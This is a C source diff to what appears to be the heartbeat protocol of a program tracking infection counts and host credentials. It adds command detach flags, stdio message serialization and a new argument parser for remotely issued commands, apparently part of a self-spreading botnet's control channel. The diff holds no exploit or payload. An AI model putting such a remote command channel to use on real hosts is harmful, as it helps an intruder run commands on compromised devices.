@@ -189,9 +189,9 @@ void prne_htbt_init_host_info (prne_htbt_host_info_t *hi) {
 	hi->infect_cnt = 0;
 	hi->parent_pid = 0;
 	hi->child_pid = 0;
-	memzero(hi->prog_ver, 16);
-	memzero(hi->boot_id, 16);
-	memzero(hi->instance_id, 16);
+	prne_memzero(hi->prog_ver, 16);
+	prne_memzero(hi->boot_id, 16);
+	prne_memzero(hi->instance_id, 16);
 	hi->host_cred = NULL;
 	hi->crash_cnt = 0;
 	hi->arch = PRNE_ARCH_NONE;
@@ -210,7 +210,7 @@ bool prne_htbt_alloc_host_info (prne_htbt_host_info_t *hi, const size_t cred_str
 		return false;
 	}
 
-	memzero(ny_mem, cred_strlen + 1);
+	prne_memzero(ny_mem, cred_strlen + 1);
 	prne_free(hi->host_cred);
 	hi->host_cred = (char*)ny_mem;
 
@@ -244,9 +244,10 @@ void prne_htbt_init_cmd (prne_htbt_cmd_t *cmd) {
 	cmd->mem = NULL;
 	cmd->args = NULL;
 	cmd->argc = 0;
+	cmd->detach = false;
 }
 
-bool prne_htbt_alloc_cmd (prne_htbt_cmd_t *cmd, const uint16_t argc, const size_t *args_len) {
+bool prne_htbt_alloc_cmd (prne_htbt_cmd_t *cmd, const size_t argc, const size_t *args_len) {
 	size_t i, str_size, pos, mem_len;
 	char *mem = NULL;
 	char **args = NULL;
@@ -362,10 +363,20 @@ void prne_htbt_free_cmd (prne_htbt_cmd_t *cmd) {
 }
 
 bool prne_htbt_eq_cmd (const prne_htbt_cmd_t *a, const prne_htbt_cmd_t *b) {
-	return
-		a->mem_len == b->mem_len &&
+	if (!(a->mem_len == b->mem_len &&
 		a->argc == b->argc &&
-		memcmp(a->mem, b->mem, a->mem_len) == 0;
+		memcmp(a->mem, b->mem, a->mem_len) == 0))
+	{
+		return false;
+	}
+
+	for (size_t i = 0; i < a->argc; i += 1) {
+		if (!prne_nstreq(a->args[i], b->args[i])) {
+			return false;
+		}
+	}
+
+	return true;
 }
 
 void prne_htbt_init_bin_meta (prne_htbt_bin_meta_t *nb) {
@@ -383,6 +394,21 @@ bool prne_htbt_eq_bin_meta (const prne_htbt_bin_meta_t *a, const prne_htbt_bin_m
 	return
 		a->bin_size == b->bin_size &&
 		prne_htbt_eq_cmd(&a->cmd, &b->cmd);
+}
+
+void prne_htbt_init_stdio (prne_htbt_stdio_t *s) {
+	s->len = 0;
+	s->err = false;
+	s->fin = false;
+}
+
+void prne_htbt_free_stdio (prne_htbt_stdio_t *s) {}
+
+bool prne_htbt_eq_stdio (const prne_htbt_stdio_t *a, const prne_htbt_stdio_t *b) {
+	return
+		a->len == b->len &&
+		a->err == b->err &&
+		a->fin == b->fin;
 }
 
 prne_htbt_ser_rc_t prne_htbt_ser_msg_head (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_msg_head_t *in) {
@@ -526,6 +552,24 @@ prne_htbt_ser_rc_t prne_htbt_ser_bin_meta (uint8_t *mem, const size_t mem_len, s
 	return PRNE_HTBT_SER_RC_OK;
 }
 
+prne_htbt_ser_rc_t prne_htbt_ser_stdio (uint8_t *mem, const size_t mem_len, size_t *actual, const prne_htbt_stdio_t *in) {
+	*actual = 2;
+	if (in->len > PRNE_HTBT_STDIO_LEN_MAX) {
+		return PRNE_HTBT_SER_RC_FMT_ERR;
+	}
+	if (mem_len < *actual) {
+		return PRNE_HTBT_SER_RC_MORE_BUF;
+	}
+
+	mem[0] =
+		(in->err ? 0x80 : 0) |
+		(in->fin ? 0x40 : 0) |
+		(prne_getmsb16(in->len, 0) & 0x0F);
+	mem[1] = prne_getmsb16(in->len, 1);
+
+	return PRNE_HTBT_SER_RC_OK;
+}
+
 
 prne_htbt_ser_rc_t prne_htbt_dser_msg_head (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_msg_head_t *out) {
 	*actual = 3;
@@ -635,59 +679,55 @@ prne_htbt_ser_rc_t prne_htbt_dser_host_info (const uint8_t *data, const size_t l
 }
 
 prne_htbt_ser_rc_t prne_htbt_dser_cmd (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_cmd_t *out) {
-	uint_fast16_t args_len, argc = 0;
+	size_t args_len, argc;
 	char **args = NULL;
 	char *mem = NULL;
 	prne_htbt_ser_rc_t ret = PRNE_HTBT_SER_RC_OK;
-	size_t i, str_len;
-	char *ptr;
+	int saved_errno;
 
 	*actual = 2;
 	if (len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
 	}
 
-	args_len = prne_recmb_msb16(0x0F & data[0], data[1]);
+	args_len = prne_recmb_msb16(0x03 & data[0], data[1]);
 	*actual += args_len;
 
 	if (len < *actual) {
 		return PRNE_HTBT_SER_RC_MORE_BUF;
 	}
-	if (args_len > PRNE_HTBT_ARG_MEM_MAX || (args_len > 0 && data[args_len + 1] != 0)) {
-		return PRNE_HTBT_SER_RC_FMT_ERR;
-	}
 
-	for (i = 0; i < args_len; i += 1) {
-		if (data[2 + i] == 0) {
-			argc += 1;
-			if (argc > PRNE_HTBT_ARGS_MAX) {
-				return PRNE_HTBT_SER_RC_FMT_ERR;
-			}
-		}
-	}
-
-	args = (char**)prne_malloc(sizeof(char*), argc + 1);
 	mem = (char*)prne_malloc(1, args_len);
-	if (args == NULL || mem == NULL) {
+	if (mem == NULL) {
 		ret = PRNE_HTBT_SER_RC_ERRNO;
 		goto END;
 	}
-
 	memcpy(mem, data + 2, args_len);
 
-	ptr = mem;
-	for (i = 0; i < argc; i += 1) {
-		str_len = strlen(ptr);
-		args[i] = ptr;
-		ptr += str_len + 1;
+	saved_errno = errno;
+	errno = 0;
+	args = prne_htbt_parse_args(
+		mem,
+		args_len,
+		0,
+		NULL,
+		&argc,
+		PRNE_HTBT_ARGS_MAX);
+	if (args == NULL) {
+		ret =
+			errno != 0 ?
+			PRNE_HTBT_SER_RC_ERRNO :
+			PRNE_HTBT_SER_RC_FMT_ERR;
+		goto END;
 	}
-	args[argc] = NULL;
+	errno = saved_errno;
 
 	prne_htbt_free_cmd(out);
 	out->mem = mem;
 	out->mem_len = args_len;
 	out->args = args;
 	out->argc = argc;
+	out->detach = (0x04 & data[0]) != 0;
 	mem = NULL;
 	args = NULL;
 
@@ -714,4 +754,66 @@ prne_htbt_ser_rc_t prne_htbt_dser_bin_meta (const uint8_t *data, const size_t le
 	out->bin_size = prne_recmb_msb32(0, data[0], data[1], data[2]);
 
 	return PRNE_HTBT_SER_RC_OK;
+}
+
+prne_htbt_ser_rc_t prne_htbt_dser_stdio (const uint8_t *data, const size_t len, size_t *actual, prne_htbt_stdio_t *out) {
+	*actual = 2;
+	if (len < *actual) {
+		return PRNE_HTBT_SER_RC_MORE_BUF;
+	}
+
+	out->err = (data[0] & 0x80) != 0;
+	out->fin = (data[0] & 0x40) != 0;
+	out->len = prne_recmb_msb16(data[0] & 0x0F, data[1]);
+
+	return PRNE_HTBT_SER_RC_OK;
+}
+
+char **prne_htbt_parse_args (char *m_args, const size_t args_size, const size_t add_argc, char **add_args, size_t *argc, const size_t max_args) {
+	char *ptr, *end = m_args + args_size, *next;
+	size_t i, cnt;
+	char **ret;
+
+	cnt = 0;
+	ptr = m_args;
+	while (ptr < end) {
+		next = prne_strnchr(ptr, 0, end - ptr);
+		if (next == NULL) {
+			return NULL; // reject non-null-terminated
+		}
+		else {
+			if (next - ptr > 0) {
+				cnt += 1;
+			}
+			ptr = next + 1;
+		}
+	}
+	cnt += add_argc;
+	if (cnt > max_args) {
+		return NULL;
+	}
+
+	ret = (char**)prne_malloc(sizeof(char*), cnt + 1);
+	if (ret == NULL) {
+		return NULL;
+	}
+	ret[cnt] = NULL;
+	if (argc != NULL) {
+		*argc = cnt;
+	}
+
+	for (i = 0; i < add_argc; i +=1) {
+		ret[i] = add_args[i];
+	}
+
+	ptr = m_args;
+	while (ptr < end) {
+		next = prne_strnchr(ptr, 0, end - ptr);
+		if (next - ptr > 0) {
+			ret[i++] = ptr;
+		}
+		ptr = next + 1;
+	}
+
+	return ret;
 }
